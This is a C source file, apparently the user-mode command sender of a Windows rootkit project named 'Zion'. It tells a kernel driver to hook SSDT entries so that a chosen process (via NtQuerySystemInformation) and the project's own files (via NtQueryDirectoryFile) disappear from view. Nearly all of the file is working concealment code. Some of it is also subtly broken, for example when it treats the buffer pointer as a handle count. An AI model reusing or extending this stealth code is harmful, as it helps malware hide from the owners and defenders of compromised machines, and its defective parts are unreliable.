/*
 *      name: SSDT HOOK COMMAND SENDER
 *      type: USER MODE
 *		Org Author: Liang Chen
 *      Version : 0.2
 */
#pragma once
#include "stdafx.h"
#include "malloc.h"
#include "stdio.h"
#include "string.h"

//#include "proxy_internal.h"
#include "zion/zion_ioctl_def.h"
#include "test_ssdt_func.h"
#include "zion/zion_define.h"
#include "zion/zion_cmd_packet.h"
#include "zion/proxy/zion_proxy_dll.h"

#include "zion_ssdt_hook.h"
#include "zion_ssdthook_cmdsender.h"



STD_EXPORT(ZIONRESULT) SSDT_HOOK_HIDE_PROCESS(DWORD pid)
{
	
	int realStub = (*(PLONG)((PBYTE)NewZwQuerySystemInformation + 1)) + (LONG)NewZwQuerySystemInformation + 5;
	//printf("aaaa");
	DWORD oldProtect;
	VirtualProtect((LPVOID)realStub,4096, PAGE_EXECUTE_WRITECOPY, &oldProtect);

	*(PLONG)((PBYTE)realStub + 0x2D) = pid;
	VirtualProtect((LPVOID)realStub,4096, oldProtect, NULL);
	//printf("aaaab");
	SSDT_HOOK(NewZwQuerySystemInformation, 
					 L"NtQuerySystemInformation"
					 );

	return 1;
}
STD_EXPORT(ZIONRESULT) SSDT_HOOK_HIDE_ZIONFILE()
{
	return SSDT_HOOK(NewNtQueryDirectoryFile, 
					 L"NtQueryDirectoryFile"
					 );
}
ZIONRESULT SSDT_HOOK(PVOID ptrFuncStub, 
					 PWCHAR  szFuncName
					 )
{
		PZION_CS_PACKET ptrZION_SSDT_Packet;
		PZION_SSDT_HOOK_CMD_DATA ptrSSDTHookCMDData;
		ptrZION_SSDT_Packet = (PZION_CS_PACKET)malloc(sizeof(ZION_CS_PACKET));
		if (NULL == ptrZION_SSDT_Packet)
		{
			printf("ZION: Memory alloc failed in SSDT_HOOK\n");
			return ZION_MEMORY_ALLOC_FAIL;
		}
		ptrSSDTHookCMDData = (PZION_SSDT_HOOK_CMD_DATA)malloc(sizeof(ZION_SSDT_HOOK_CMD_DATA));
		if (NULL == ptrSSDTHookCMDData)
		{
			printf("ZION: Memory alloc failed in SSDT_HOOK\n");
			return ZION_MEMORY_ALLOC_FAIL;
		}
		if (ZION_OK != ZION_SetSSDTCMDData(ptrSSDTHookCMDData,
											(DWORD)ptrFuncStub,
											szFuncName))
		{
			printf("ZION: Error in SSDT_HOOK\n");
			return ZION_ERROR;
		}
		if (ZION_OK != ZION_SetPacketValue(ptrZION_SSDT_Packet,
											CMD_SSDT_HOOK,
											ptrSSDTHookCMDData,
											sizeof(ZION_SSDT_HOOK_CMD_DATA)))
		{
			printf("ZION: Error in SSDT_HOOK\n");
			return ZION_ERROR;
		}
		
		DWORD dwReceived;
		//Maybe need to judge whether g_hZionServer_Dev is NULL
		if (!DeviceIoControl(g_hZionServer_Dev,
						IOCTL_ZION_CS_PKT_CMD,
						(LPVOID) ptrZION_SSDT_Packet,
						sizeof(ZION_CS_PACKET),
						NULL,
						0,
						&dwReceived,
						NULL))
		{
			printf("ZION: Device IO CTRL Error in SSDT_HOOK\n");
			free(ptrZION_SSDT_Packet);
			free(ptrSSDTHookCMDData);
			return ZION_ERROR;
		}
		printf("ZION: SSDT HOOK %s Succedd\n", szFuncName);
		free(ptrZION_SSDT_Packet);
		free(ptrSSDTHookCMDData);
		return ZION_OK;
		//ZION_SetPacketValue(ptrZION_SSDT_Packet, CMD_SSDT_HOOK, 
}

ZIONRESULT ZION_SetSSDTCMDData(PZION_SSDT_HOOK_CMD_DATA data,
							   DWORD ptrFuncAddr,
							   PWCHAR  SSDTFuncName)
{
	if ((NULL == data) || (NULL == ptrFuncAddr) || (NULL == SSDTFuncName))
	{
		printf("ZION: Argu error in ZION_SetSSDTCMDData\n");
		return ZION_ERROR;
	}

	data->AddressOfStub = ptrFuncAddr;
	wcscpy_s(data->FuncName, SSDT_FUNC_NAME_MAXLEN, SSDTFuncName);
	//data->dwEPROCESS = GetEPROCESSAddr(GetCurrentProcessId());
	return ZION_OK;
}
ZIONRESULT GetEPROCESSAddr(DWORD PID)
{
	ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = NULL;
	HANDLE hNtdll = GetModuleHandle(L"ntdll.dll");
	if (!hNtdll)
	{
		printf("ZION: GetModuleHandle Failed\n");
		return ZION_ERROR;
	}
	ZwQuerySystemInformation = ( ZWQUERYSYSTEMINFORMATION )GetProcAddress( (HMODULE)hNtdll, "ZwQuerySystemInformation" );
	if (!ZwQuerySystemInformation)
	{
		printf("ZION: GetProcAddr Failed\n");
		return ZION_ERROR;
	}
	PVOID ProcessList;
	NTSTATUS                    status;
	PVOID                        buf   = NULL;
	ULONG                        size  = 1;
	ULONG                        NumOfHandle = 0;
	ULONG                        i;
	PSYSTEM_HANDLE_INFORMATION    h_info  = NULL;

	for ( size = 1; ; size *= 2 )
	{
		if ( NULL == ( buf = calloc( size, 1 ) ) )
		{
			fprintf( stderr, "calloc( %u, 1 ) failed\n", size );
			goto GetEprocessFromPid_exit;
		}
		status = ZwQuerySystemInformation( SystemHandleInformation, buf, size, NULL );
		if ( !NT_SUCCESS( status ) )
		{
			if ( STATUS_INFO_LENGTH_MISMATCH == status )
			{
				free( buf );
				buf = NULL;
			}
			else
			{
				printf( "ZwQuerySystemInformation() failed");
				goto GetEprocessFromPid_exit;
			}
		}
		else
		{
			break;
		}
	} 
	NumOfHandle = (ULONG)buf;

	h_info = ( PSYSTEM_HANDLE_INFORMATION )((ULONG)buf+4);

	for(i = 0; i<NumOfHandle ;i++)
	{
		if( ( h_info[i].ProcessId == PID )&&( h_info[i].ObjectTypeNumber == 5  ))//&&( h_info[i].Handle==0x3d8 ) )
		{
			printf("Handle:0x%x,OBJECT 0x%x\n\r",h_info[i].Handle,h_info[i].Object);
			return((DWORD)(h_info[i].Object));
		}
	}
GetEprocessFromPid_exit:
	if ( buf != NULL )
	{
		free( buf );
		buf = NULL;
	}
	return(FALSE);

}
